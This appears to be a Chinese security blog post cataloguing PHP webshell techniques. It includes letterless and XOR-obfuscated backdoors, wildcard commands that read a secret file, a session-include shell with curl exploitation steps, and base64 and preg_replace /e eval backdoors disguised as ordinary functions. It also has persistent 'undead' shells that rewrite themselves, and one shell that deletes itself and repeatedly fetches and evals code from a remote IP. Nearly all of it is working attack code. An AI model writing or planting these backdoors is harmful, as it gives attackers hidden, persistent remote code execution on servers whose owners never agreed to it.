---
title: php-命令执行
passwd: 345678
abbrlink: 5109
date: 2018-07-18 15:58:22
tags: web安全
---

## webshell 没字母

```shell
<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
=> 
$_GET[_]($_GET[__]);
=>
<?=`{${~"����"}[_]}`;
// echo -ne '<?=`{${~"\xa0\xb8\xba\xab"}[_]}`;'
```

## 写文件&读文件

php的标签<?php存在字母肯定不行，尝试<?发现不解析，没有开启段标签。
查资料后发现<?=可以作为php标签。<?=的含义为<?php echo，是PHP 5.4.0以后的新特性
**不管是否设置 short_open_tag php.ini 选项，<?= 将总是可用。**

```shell
<?=$_=`/???/??? ../??????.???>@#$`;
=> 
/bin/cat ../secret.php>@#$
=> 
cat ../secret.php>@#$
=>
<?=`/???/??? ../??????.??? > ===`
=>
<?=`/???/??? ../*`;
```

参考链接: 

* http://www.likesec.com/2017/12/08/webshell/

* https://www.jianshu.com/p/13cb1d8d0441

## 高隐蔽shell

```php
<?php
session_start();
extract($_GET);
if(preg_match('/[0-9]/',$_SESSION['PHPSESSID']))
                   exit;
if(preg_match('//|./',$_SESSION['PHPSESSID']))
                   exit;
include(ini_get("session.save_path")."/sess_".$_SESSION['PHPSESSID']);
?>
```

```
curl -b "PHPSESSID=abc" "http://192.168.21.147/shell.php?_SESSION[PHPSESSID]=}?%3E%3C?php%20system($_GET[a]);%20/*"
这时候，shell就会保存在"session.save_path"."/sess_abc"中
curl -b "PHPSESSID=abc" "http://192.168.21.147/shell.php?_SESSION[PHPSESSID]=abc&a=ls"
即可利用。
```

## 高隐蔽shell2

```
<?php
//pwd=addimg
$sss = "ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NCcGMzTmxkQ2dnSkY5U1JWRlZSVk5VV3lkd1lYTnpKMTBnS1NsN1FHVjJZV3dvSUdKaGMyVTJORjlrWldOdlpHVW9JQ1JmVWtWUlZVVlRWRnNuY0dGemN5ZGRJQ2tnS1R0OVpXeHpaWHRBWlhaaGJDZ2dKRjlTUlZGVlJWTlVXeWRoWkdScGJXY25YU0FwTzMwPSIpKQ==";
function CheckSQL( &$val ){ 
    $v = "select|update|union|set|where|order|and|or";
    $val = base64_decode( $val );
}
CheckSQL( $sss );
preg_replace('/uploadsafe.inc.php/e','@'.$sss, 'uploadsafe.inc.php');
?>
解密后:
解密后为：if ( isset( $_REQUEST['pass'] )){@eval( base64_decode( $_REQUEST['pass'] ) );}else{@eval( $_REQUEST['addimg'] );}
```

## 高隐蔽shell3

```
<?php
if (!function_exists('get_c1ient_area')) {
    function get_c1ient_area() {
        $_SERVER['REM0TE_ADDR'] = 'REM0TE_CREATE_QGV2YWwoJF';
        $_SERVER['HTTP_CL1ENT_1P'] = 'STR_9QT1NUW2F';
        $_SERVER['HTTP_X_F0RWARDED_FOR'] = 'BASE_SERVER64_kbV0pOw==';
        $get_c1ient_area = substr($_SERVER['REM0TE_ADDR'], 7, 7) . "FUNCTION";
        $getenv = substr($_SERVER['HTTP_CL1ENT_1P'], 0, 4) . "REPLACE";
        $isset = $getenv('_SERVER', '', substr($_SERVER['HTTP_X_F0RWARDED_FOR'], 0, 14)) . "DECODE";
        //@eval($_POST[adm])
        $rea1area = $isset(substr($_SERVER['REM0TE_ADDR'], 14) . substr($_SERVER['HTTP_CL1ENT_1P'], 4) . substr($_SERVER['HTTP_X_F0RWARDED_FOR'], 14));
        echo $rea1area;
        $on1inearea = $get_c1ient_area('', $rea1area);
        $on1inearea();
        return @$onlinearea;
    }
    $on1inearea = get_c1ient_area();
}
?>
解密后:
@eval($_POST[adm])
```

```
<?php
    # return 32md5 back 6
    function getMd5($md5 = null) {
        $key = substr(md5($md5),26);
        return $key; 
        } 
        $array = array(
            chr(112).chr(97).chr(115).chr(115), //pass
            chr(99).chr(104).chr(101).chr(99).chr(107), // check
            chr(99).chr(52).chr(53).chr(49).chr(99).chr(99)    // c451cc
        );
        if ( isset($_POST) ){
            $request = &$_POST;
        } 
        
        elseif ( isset($_REQUEST) )  $request = &$_REQUEST;
        
        if ( isset($request[$array[0]]) && isset($request[$array[1]]) ) { 
            if ( getMd5($request[$array[0]]) == $array[2] ) {  //md5(pass) == c451cc
                $token = preg_replace (
                chr(47) . $array[2] . chr(47) . chr(101),  //  /c451cc/e
                $request[$array[1]], 
                $array[2]
            );
        }
    }
?>
```

```
<?php
$MMIC= $_GET['tid']?$_GET['tid']:$_GET['fid'];
if($MMIC >1000000){
  die('404');
}
if (isset($_POST["\x70\x61\x73\x73"]) && isset($_POST["\x63\x68\x65\x63\x6b"]))
{
  $__PHP_debug   = array (
    'ZendName' => '70,61,73,73', 
    'ZendPort' => '63,68,65,63,6b',
    'ZendSalt' => '792e19812fafd57c7ac150af768d95ce'
  );
 
  $__PHP_replace = array (
    pack('H*', join('', explode(',', $__PHP_debug['ZendName']))),
    pack('H*', join('', explode(',', $__PHP_debug['ZendPort']))),
    $__PHP_debug['ZendSalt']
  );
 
  $__PHP_request = &$_POST;
  $__PHP_token   = md5($__PHP_request[$__PHP_replace[0]]);
 
  if ($__PHP_token == $__PHP_replace[2])
  {
    $__PHP_token = preg_replace (
      chr(47).$__PHP_token.chr(47).chr(101),
      $__PHP_request[$__PHP_replace[1]],
      $__PHP_token
    );
 
    unset (
      $__PHP_debug,
      $__PHP_replace,
      $__PHP_request,
      $__PHP_token
    );
 
    if(!defined('_DEBUG_TOKEN')) exit ('Get token fail!');
 
  }
}
```

## php反射机制（太明显）

```
<?php
    /**
    * eva
    * l($_POS
    * T["c"]);
    * asse
    * rt
    */
    class TestClass { }
    $rc = new ReflectionClass('TestClass');
    $str = $rc->getDocComment();
    $payload = substr($str,strpos($str,'ev'),3);
    $payload .= substr($str,strpos($str,'l('),7);
    $payload .= substr($str,strpos($str,'T['),8);
    $exe = substr($str, strpos($str, 'as'), 4);
    $exe .= substr($str, strpos($str, 'rt'), 2);
    
    $exe($payload);
?>
解密后:
assert(eval($_POST["c"]));
```

## XOR （太花哨）

```
<?php
    @$_++; // $_ = 1
    $__=("#"^"|"); // $__ = _
    $__.=("."^"~"); // _P
    $__.=("/"^"`"); // _PO
    $__.=("|"^"/"); // _POS
    $__.=("{"^"/"); // _POST 
    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
?>
```

## 反引号（太花哨）

```
<?php
$y = ~"瀸寶崑";    // assert
$cmd = ~"暅挌挌洖"; // jcmemeda
$y($_REQUEST[$cmd]);
?>
```

## 加号（太花哨）

```
<?php
$num = +"";
$num++; $num++; $num++; $num++;
$four = $num; // 4
$num++; $num++;
$six = $num; // 6
$_="";
$_[+$_]++;  // +""为0
$_=$_.""; // $_为字符串"Array"
$___=$_[+""];//A
$____=$___;
$____++;//B
$_____=$____;
$_____++;//C
$______=$_____;
$______++;//D
$_______=$______;
$_______++;//E
$________=$_______;
$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O
$_________=$________;
$_________++;$_________++;$_________++;$_________++;//S
$_=$____.$___.$_________.$_______.$six.$four.'_'.$______.$_______.$_____.$________.$______.$_______;
$________++;$________++;$________++;//R
$_____=$_________;
$_____++;//T
$__=$___.$_________.$_________.$_______.$________.$_____;
$__($_("ZXZhbCgkX1BPU1RbY21kXSk=")); 
//ASSERT(BASE64_DECODE("ZXZhbCgkX1BPU1RbY21kXSk="));  
//ASSERT(eval($_POST[cmd]));  
?>
```

## 内存shell(不死马)

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
$file = "veneno.php";
$shell = "<?php eval($_POST[venenohi]);?>";
while (TRUE) {
    if (!file_exists($file)) {
        file_put_contents($file, $shell);
    }
    usleep(50);
}
?>
```

```php
<?php
$password = "LandGrey";
$key = substr(__FILE__,-5,-4);
${"LandGrey"} = $_SERVER["HTTP_ACCEPT"]."Land!";
$f = pack("H*", "13"."3f120b1655") ^ $LandGrey;
array_intersect_uassoc(array($_REQUEST[$password] => ""), array(1), $f);
?>
```

```php
<?php
    unlink($_SERVER['SCRIPT_FILENAME']);     //删除脚本
    ignore_user_abort(true);
    set_time_limit(0);
    $remote_file = 'http://123.207.90.143/tmp.txt';               // 从远端获取指令
    while($code = file_get_contents($remote_file)){
    @eval($code);
    sleep(5);
};
?>          // 不好使
```

## 内存shell2

```php
<?php  
    set_time_limit(0);  
    ignore_user_abort(1);  
    unlink(__FILE__);  
    while(1){  
        file_put_contents('webshell.php','<?php @eval($_POST["password"]);?>');  
        sleep(1);  
    }
?>       // 好使
```